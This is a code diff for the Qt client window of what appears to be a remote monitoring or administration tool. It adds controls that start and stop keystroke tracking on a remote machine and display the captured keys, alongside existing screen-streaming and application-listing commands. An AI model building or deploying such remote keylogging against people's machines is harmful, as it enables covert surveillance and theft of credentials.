@@ -21,6 +21,7 @@ ClientWindow::ClientWindow(QWidget *parent) :
     connect(client, &Client::stringMessageReceived, this, &ClientWindow::updateServerMsg);
 //    connect(client, &Client::imageMessageReceived, this, &ClientWindow::updateImage);
     connect(client, &Client::fileStructReceived, this, &ClientWindow::updateFileStruct);
+    connect(client, &Client::strokeMessageReceived, this, &ClientWindow::updateStrokeText);
 
 
 
@@ -77,6 +78,10 @@ void ClientWindow::updateServerMsg(const QString &msg) {
 //    serverMsgBox->setText(msg);
 }
 
+void ClientWindow::updateStrokeText(QString str){
+    keystroke_wind->display_stroke(str);
+}
+
 void ClientWindow::updateImage(const QPixmap &image) {
 //    qDebug() << "display picture?";
 //    if (screenshotLabel == nullptr) {
@@ -125,7 +130,22 @@ void ClientWindow::on_pushButton_clicked_2(){
     client->sendMessage(tr("list applications"));
 }
 void ClientWindow::on_pushButton_clicked_3(){
-    client->sendMessage(tr("keyboard track"));
+
+    keystroke_wind = new keystroke(ui->widget_2);
+    connect(keystroke_wind, &keystroke::start_hook, [=]{
+        client->sendMessage(tr("keyboard_track"));
+        qDebug() << "stroke signal sent";
+    });
+
+    connect(keystroke_wind, &keystroke::end_hook, [=]{
+        client->sendMessage(tr("stop_stroke"));
+        qDebug() << "end stroke signal sent";
+    });
+    connect(keystroke_wind, &keystroke::end_session_stroke, [=]{
+        delete keystroke_wind;
+        keystroke_wind = nullptr;
+    });
+
 
 }
 void ClientWindow::on_pushButton_clicked_4(){
@@ -167,6 +187,10 @@ void ClientWindow::on_pushButton_clicked_6(){
     });
     connect(stream_win, &screendisplayer::close_stream, [=]{
         client->sendMessage(tr("stop_stream"));
+    });
+    connect(stream_win, &screendisplayer::end_session, [=]{
+        delete stream_win;
+        stream_win = nullptr;
     });
     connect(client, &Client::streamMessageReceived, [=]{
         stream_win->display_image(client->rcv_bitmap);
